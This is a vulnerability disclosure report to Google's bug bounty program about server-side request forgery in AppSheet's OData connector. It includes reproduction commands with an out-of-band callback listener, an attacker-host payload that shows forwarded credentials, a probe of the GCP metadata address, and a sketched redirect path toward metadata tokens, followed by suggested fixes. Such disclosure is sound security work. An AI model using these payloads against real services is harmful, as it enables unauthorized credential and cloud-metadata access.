# Google VRP Report — F002

## Title
Server-Side Request Forgery in AppSheet OData data connector — confirmed server-side
fetch from GCP backend with credential and internal tracing-header leak; GCP IMDS
TCP-reachable from backend

## Summary
AppSheet's OData data connector performs a server-side HTTP(S) request to a user-supplied
"OData Service Root URL" when the **Test** button is clicked. An authenticated attacker
using a free AppSheet account can point this URL at an attacker-controlled server and
receive a genuine server-side fetch from AppSheet's GCP backend. The captured request
**leaks the OData credentials entered in the form** (`Authorization: Basic` header) and an
**internal W3C `Traceparent` distributed-tracing header**. Separately, the link-local GCP
Instance Metadata Service address (`169.254.169.254:443`) is **TCP-reachable** from the
backend — established via TLS-failure differentiation. This last point is documented as a
**network-reachability risk only**: no metadata, token, or credential was retrieved from
IMDS, and no redirect chaining or internal port probing was performed.

## Affected Component
- **Asset:** `appsheet.com` — OData connector configuration / **Test** action
  (Account → Add OData connection information → "OData Service Root URL")
- **Backend origin observed:** GCP IP `35.203.182.241` (AppSheet backend)
- **Scope:** In-scope — `appsheet.com` matches `*.appsheet.com` (Google VRP, AppSheet, TIER0)
- **Missing control:** the backend HTTP client that validates OData metadata applies no
  SSRF protection (no IP allow/deny list, no link-local/RFC1918 filtering) and forwards
  user-supplied credentials and internal headers without sanitization.

## Reproduction
Reproducible with a free AppSheet account; no paid plan required.

```bash
# 1) Start an out-of-band listener
interactsh-client -server oast.pro 2>&1 | tee /tmp/oob.log &
sleep 3
OOB_URL=$(grep -o '[a-z0-9]*\.oast\.pro' /tmp/oob.log | head -1)
echo "OOB: https://${OOB_URL}"

# 2) In AppSheet (free account): Account -> Add OData connection information
#    OData Version:          4.0
#    OData Service Root URL:  https://<OOB_URL>
#    Username:               testuser
#    Password:               testpass1234
#    Click "Test"

# 3) Observe the out-of-band interaction
grep -E "(DNS|HTTP) interaction" /tmp/oob.log
#  [<id>] Received DNS interaction (A) from 192.178.x.x   (Google AS15169)
#  [<id>] Received HTTP interaction from 35.203.182.241   (GCP AppSheet backend)
```

## Evidence Already Captured
### 1. Full server-side HTTP request from GCP backend (credential + header leak)
Payload `https://d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro`, form Username `testuser` /
Password `testpass1234`, **Test** clicked. Request received from `35.203.182.241`:

```http
GET /$metadata HTTP/1.1
Host: d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00
```

- `Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0` → base64-decodes to
  `testuser:testpass1234`. **The credentials entered in the OData form are forwarded
  verbatim to the destination server.**
- `Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-...` — AppSheet's internal W3C trace
  context, leaking backend distributed-tracing identifiers and confirming a genuine
  server-side request (not browser-initiated).

### 2. DNS resolution via Google infrastructure
```
DNS (A)    from 192.178.118.93  — Google LLC, AS15169
DNS (AAAA) from 192.178.118.80  — Google LLC, AS15169
HTTP GET   from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

### 3. Response content reflected in the error
AppSheet's error included the OOB server's response content type, proving the backend
received and partially parsed the response:
```
"...None of the supported type(s): 'Microsoft.OData.ODataMediaType, ...' matches the
content type 'text/html; charset=utf-8'."
```

### 4. GCP IMDS TCP-reachability (documented risk — not exploited)
Payload `https://169.254.169.254` returns:
```
Error: Failed to obtain the OData feed's metadata.
Message : The SSL connection could not be established, see inner exception.
```
This differs categorically from the client-side block for bare `http://` URLs
(*"Connection must be established using HTTPS for security reasons"*). *"The SSL
connection could not be established"* is a .NET `HttpRequestException` thrown **after**
the TCP connection is initiated — i.e., the backend opened a TCP socket to
`169.254.169.254:443` and failed only at TLS negotiation (IMDS serves no TLS cert).

**This establishes network-layer reachability of the GCP metadata service from the
AppSheet backend pod — a risk — and nothing more.** No IMDS endpoint path was requested,
no token/credential was retrieved, no redirect chain was constructed, and no internal
port scanning was performed.

## Impact
**Confirmed:**
- Server-side HTTP fetch executed from AppSheet's GCP backend (`35.203.182.241`) to an
  arbitrary attacker-controlled URL (SSRF), with DNS resolved via Google resolvers.
- **Credential leak:** any Username/Password entered into the OData form is forwarded in
  an `Authorization: Basic` header to the attacker-controlled destination. In the
  shared-/imported-connector phishing scenario, this captures a *victim's* real OData
  service credentials with no browser interaction on the attacker's part.
- **Internal header leak:** the `Traceparent` W3C trace context exposes AppSheet's
  backend distributed-tracing identifiers.
- Response content type is reflected back in the error message (information disclosure of
  connection success).
- No authentication beyond a free account, no rate limiting, and no IP restriction
  protect the OData **Test** action.

**Documented risk (not exploited):**
- The GCP Instance Metadata Service (`169.254.169.254:443`) is **TCP-reachable** from the
  AppSheet backend. The only observed barrier is the client-side HTTPS requirement on the
  URL field combined with IMDS being HTTP-only. A redirect-based escalation
  (HTTPS → `http://169.254.169.254/...`) is a *plausible* path to metadata/token access
  **if** the backend HTTP client follows cross-scheme redirects — this was **not tested
  and not attempted**, and should be assessed by AppSheet internally. It is included here
  as a risk indicator, not as a demonstrated credential retrieval.

## CVSS 3.1
**Confirmed SSRF with credential + internal-header leak:**
`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7 (High)**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Triggered via AppSheet web app |
| Attack Complexity | Low | Single Test click against attacker URL |
| Privileges Required | Low | Free AppSheet account |
| User Interaction | None | For the self-initiated SSRF (the phishing variant adds victim UI) |
| Scope | Changed | Vulnerable component (AppSheet app) causes requests from the GCP backend, a different authorization boundary, reaching internal-only network space |
| Confidentiality | High | Credential forwarding + internal tracing-header leak + confirmed reach into internal/link-local GCP network |
| Integrity / Availability | None | No write or DoS demonstrated |

*Note:* the C:H rating reflects the credential forwarding and the demonstrated reach of
the server-side request into internal/link-local GCP network space. It does **not** rely
on IMDS credential retrieval, which was not performed. If AppSheet triage prefers to score
only the data definitively exfiltrated in the self-test, a conservative
`...S:C/C:L/...` = 5.0 (Medium) is the floor; the credential-phishing variant and internal
reachability justify the High rating.

## Suggested Fix
1. **Egress IP filtering on the backend HTTP client:** before connecting, resolve the
   target URL and deny link-local (`169.254.0.0/16`), loopback (`127.0.0.0/8`), and
   RFC1918 ranges — validated *after* DNS resolution to defeat DNS-rebinding/alias tricks.
2. **Do not forward unrelated headers:** strip/scope the `Traceparent` (and any internal
   tracing headers) from outbound user-directed requests; never propagate internal trace
   context to user-supplied destinations.
3. **Disable cross-scheme redirect following** (HTTPS → HTTP) on the OData HTTP client,
   and cap redirects; re-validate the destination IP on every redirect hop.
4. **Trim error messages:** do not echo the response content-type/headers of the
   user-supplied destination back to the user.
5. **Credential handling:** warn users that OData credentials are transmitted to the
   configured URL; consider validating the destination host before sending Basic auth.

## References
- GCP IMDS documentation: https://cloud.google.com/compute/docs/metadata/overview
- OOB interaction timestamp: 2026-06-15 20:03:15 UTC; backend source IP `35.203.182.241`;
  Google resolvers `192.178.118.x` (AS15169).
- Duplicate-check: see `dedup-CVE-2023-4212.md` (this finding is **not** a duplicate of
  CVE-2023-4212).

## Notes for triage / scope discipline
Per the authorized scope of this engagement, IMDS token retrieval, redirect chaining to
internal addresses, and internal port probing were intentionally **not** performed. IMDS
is reported strictly as confirmed TCP-reachability (a risk) for AppSheet to remediate.
